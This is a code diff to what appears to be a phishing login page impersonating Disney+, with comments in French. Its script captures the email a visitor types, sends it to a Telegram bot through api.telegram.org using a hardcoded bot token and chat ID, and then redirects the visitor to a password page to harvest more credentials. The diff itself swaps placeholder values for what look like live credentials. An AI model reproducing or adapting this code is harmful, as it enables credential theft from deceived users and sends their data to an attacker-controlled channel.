@@ -207,18 +207,21 @@
     <div class="spinner"></div>
   </div>
 
-  <script>
+<script>
   document.getElementById("loginForm").addEventListener("submit", function(e) {
     e.preventDefault();
 
-    const email = document.getElementById("email").value.trim();
+    const emailInput = document.querySelector('input[type="email"]');
+    const email = emailInput.value.trim();
+
+    if (!email) return;
 
     // Affiche le spinner
     document.getElementById("spinnerOverlay").style.display = "flex";
 
-    // Envoi vers Telegram
-    const botToken = "TON_BOT_TOKEN";
-    const chatId = "TON_CHAT_ID";
+    // Envoi du message à Telegram
+    const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
+    const chatId = "1887198443";
     const message = `📩 Nouvelle adresse email saisie sur Disney+ :\n\n${email}`;
 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -238,8 +241,7 @@
       }, 2500);
     })
     .catch((error) => {
-      console.error("Erreur lors de l'envoi à Telegram :", error);
-      // Redirige quand même après 2,5 secondes
+      console.error("Erreur Telegram:", error);
       setTimeout(() => {
         window.location.href = "password.html";
       }, 2500);
